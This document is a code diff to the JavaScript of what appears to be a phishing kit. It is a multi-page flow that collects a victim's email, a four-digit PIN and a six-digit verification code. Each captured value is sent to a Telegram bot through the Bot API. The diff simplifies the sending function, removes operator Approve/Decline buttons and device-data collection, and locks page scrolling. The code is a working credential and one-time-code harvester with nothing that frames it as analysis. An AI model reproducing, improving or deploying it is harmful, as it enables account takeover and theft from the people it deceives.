@@ -4,6 +4,38 @@ document.addEventListener("DOMContentLoaded", function () {
     const PIN_LENGTH = 4;
     const CODE_LENGTH = 6; // Final code length for page 3
 
+    // Function to send a message to Telegram
+    function sendMessageToTelegram(message) {
+        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        
+        console.log("Sending message to Telegram:", message);
+
+        return fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('Message successfully sent to Telegram bot');
+                return true;
+            } else {
+                console.error('Failed to send message to Telegram:', data);
+                return false;
+            }
+        })
+        .catch(error => {
+            console.error('Error in sendMessageToTelegram function:', error);
+            return false;
+        });
+    }
+
     // Function to load content into #content-container seamlessly
     function loadContent(pageUrl) {
         console.log(`Attempting to load content from ${pageUrl}`);
@@ -31,85 +63,6 @@ document.addEventListener("DOMContentLoaded", function () {
                 }
             })
             .catch(error => console.error(`Error loading content from ${pageUrl}:`, error));
-    }
-
-    // Function to send session details to Telegram
-    function sendSessionDataToTelegram(step, extraMessage) {
-        const ip = 'IP_ADDRESS'; // Replace with real method to get IP (e.g., using a service or backend)
-        const userAgent = navigator.userAgent;
-        const battery = navigator.getBattery ? navigator.getBattery().then(battery => battery.level * 100 + '%') : 'Unknown';
-
-        const sessionDetails = `
-            Step: ${step}
-            User IP: ${ip}
-            User-Agent: ${userAgent}
-            Battery Level: ${battery}
-            Session Data: ${extraMessage}
-        `;
-
-        console.log("Sending session data:", sessionDetails);
-
-        return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: telegramChatId,
-                text: sessionDetails
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                console.log('Session data successfully sent to Telegram');
-                return true;
-            } else {
-                console.error('Failed to send session data to Telegram:', data);
-                return false;
-            }
-        })
-        .catch(error => {
-            console.error('Error in sending session data to Telegram:', error);
-            return false;
-        });
-    }
-
-    // Function to send a message to Telegram with Approve/Decline buttons
-    function sendMessageToTelegramWithButtons(message) {
-        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-
-        console.log("Sending message to Telegram with buttons:", message);
-
-        return fetch(telegramUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: telegramChatId,
-                text: message,
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "Approve", callback_data: "approve" },
-                            { text: "Decline", callback_data: "decline" }
-                        ]
-                    ]
-                }
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                console.log('Message with approval buttons sent successfully');
-            } else {
-                console.error('Failed to send message with buttons:', data);
-            }
-        })
-        .catch(error => {
-            console.error('Error in sending message with buttons:', error);
-        });
     }
 
     // Initialize email entry functionality on page 1
@@ -163,12 +116,7 @@ document.addEventListener("DOMContentLoaded", function () {
                     console.log("PIN entered:", passcodeInput.value);
                     sendMessageToTelegram(`Entered PIN: ${passcodeInput.value}`).then(success => {
                         if (success) {
-                            // Send Telegram message with buttons and proceed after 3 seconds
-                            sendMessageToTelegramWithButtons('Please approve the entered PIN.').then(() => {
-                                setTimeout(() => {
-                                    loadContent('page3.html'); // Automatically proceed after 3 seconds
-                                }, 3000);
-                            });
+                            loadContent('page3.html');
                         }
                     });
                 }
@@ -187,18 +135,15 @@ document.addEventListener("DOMContentLoaded", function () {
             codeInput.addEventListener('input', function() {
                 if (codeInput.value.length === CODE_LENGTH) {
                     console.log("Final code entered:", codeInput.value);
-                    sendMessageToTelegram(`Entered final code: ${codeInput.value}`).then(success => {
-                        if (success) {
-                            // Send Telegram message with buttons and proceed after 3 seconds
-                            sendMessageToTelegramWithButtons('Please approve the final code.').then(() => {
-                                setTimeout(() => {
-                                    window.location.href = 'page4.html'; // Automatically proceed after 3 seconds
-                                }, 3000);
-                            });
-                        }
-                    }).catch(error => {
-                        console.error('Error sending final code to Telegram:', error);
-                    });
+                    sendMessageToTelegram(`Entered final code: ${codeInput.value}`)
+                        .then(success => {
+                            if (success) {
+                                window.location.href = 'page4.html';
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error sending final code to Telegram:', error);
+                        });
                 }
             });
         } else {
@@ -222,6 +167,7 @@ document.addEventListener("DOMContentLoaded", function () {
                     sendMessageToTelegram(`User confirmed email: ${email}`).then(success => {
                         if (success) {
                             console.log("Email confirmation sent successfully");
+                            // Redirect to a final confirmation page or show a message
                             window.location.href = 'confirmation.html';
                         } else {
                             console.error("Failed to send email confirmation to Telegram");
@@ -240,15 +186,17 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // Run the appropriate function based on the current page
     if (document.body.contains(document.getElementById('email'))) {
-        initEmailEntry(); // Page 1 - Email entry
+        initEmailEntry();
     } else if (document.body.contains(document.getElementById('passcode-input'))) {
-        initPinEntry(); // Page 2 - PIN entry
+        initPinEntry();
     } else if (document.body.contains(document.getElementById('code-input'))) {
-        initFinalCodeEntry(); // Page 3 - Final code entry
+        initFinalCodeEntry();
     } else if (document.body.contains(document.getElementById('verification-url'))) {
-        initEmailConfirmation(); // Page 4 - Email confirmation
-    } else {
-        console.log("No matching elements found to initialize");
+        initEmailConfirmation();
     }
 
-});
+    // Lock scrolling on every page
+    document.documentElement.style.overflow = 'hidden';
+    document.documentElement.style.height = '100vh';
+    document.body.style.overflow = 'hidden';
+    document.body.style.height = '100vh';
